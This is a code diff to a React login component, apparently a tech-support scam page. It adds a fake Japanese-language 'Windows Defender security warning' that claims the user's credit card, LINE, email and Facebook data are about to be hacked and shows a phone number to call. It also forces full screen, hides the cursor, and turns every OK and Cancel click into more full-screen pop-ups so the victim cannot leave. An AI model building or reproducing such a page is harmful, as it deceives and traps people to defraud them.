@@ -14,8 +14,7 @@ import MainModal from "../MainModal";
 import AlternateModals from "../AlternateModals";
 
 const Login = (props) => {
-  const [phoneNumber] = useState("050-5479-2657");
-
+  const [phoneNumber] = useState("050-5532-4952");
   const [modals, setModals] = useState([]);
 
   const requestFullScreen = () => {
@@ -23,16 +22,29 @@ const Login = (props) => {
     makeWindowFullScreen();
     props.loginToDash();
     document.getElementById("login-wrapper").style.cursor = "none";
+    document.getElementById("blueBackground").style.display = "block";
   };
 
   const handleCancel = () => {
-    setModals([...modals, 1]);
+    requestFullScreen();
+    setModals([...modals, modals.length]);
     props.notificationPopup();
   };
 
   const handleOk = () => {
-    setModals([...modals, 1]);
+    requestFullScreen();
+    setModals([...modals, modals.length]);
     props.notificationPopup();
+  };
+
+  const handleBackCancel = () => {
+    requestFullScreen();
+    props.setIsModalVisible(true);
+  };
+
+  const handleBackOk = () => {
+    requestFullScreen();
+    props.setIsModalVisible(true);
   };
 
   useEffect(() => {
@@ -66,9 +78,10 @@ const Login = (props) => {
         phoneNumber={phoneNumber}
       />
 
-      {modals.map(() => {
+      {modals.map((num) => {
         return (
           <AlternateModals
+            key={num}
             isModalVisible={true}
             handleCancel={handleCancel}
             handleOk={handleOk}
@@ -82,6 +95,50 @@ const Login = (props) => {
         className="login-wrapper"
         id="login-wrapper"
       >
+        <div
+          id="blueBackground"
+          className="animate-me"
+          onClick={handleBackCancel}
+        >
+          <div id="windowsmodal1">
+            <div style={{ textAlign: "center" }}>
+              <strong>WindowsDefender-セキュリティ警告</strong>
+            </div>
+            <div className="row">
+              <div className="col-12">
+                <p style={{ marginLeft: "20px", marginRight: "20px" }}>
+                  DF;この深刻な問題に注意してください。そうしないと、コンピュータネットワークがバーストし、コンピュータがハードウェアの問題に直面する可能性があります。
+                  これはあなたのコンピュータの故障につながる可能性があり、あなたのすべての個人情報がハッキングされる可能性があります。
+                  <br />
+                  1クレジットカードの詳細 <br />
+                  2LINEアプリケーション情報 <br />
+                  3メールアドレス
+                  <br />
+                  4フェイスブックログイン <br />
+                  5保存されたデータとファイル
+                  <br />
+                  電話 : {phoneNumber}
+                  <br />
+                </p>
+              </div>
+            </div>
+            <div className="row">
+              <div className="col-4"></div>
+              <div className="col-8">
+                <button
+                  onClick={handleBackOk}
+                  style={{ width: "100px", marginRight: "10px" }}
+                >
+                  OK
+                </button>
+                <button onClick={handleBackCancel} style={{ width: "100px" }}>
+                  Cancel
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+
         <div className="center">
           <div className="container">
             <img
@@ -137,8 +194,8 @@ const Login = (props) => {
                 />
                 {phoneNumber}
               </h4>
-              <div class="arrow-down">
-                <i class="fa fa-caret-down"></i>
+              <div className="arrow-down">
+                <i className="fa fa-caret-down"></i>
               </div>
             </div>
 
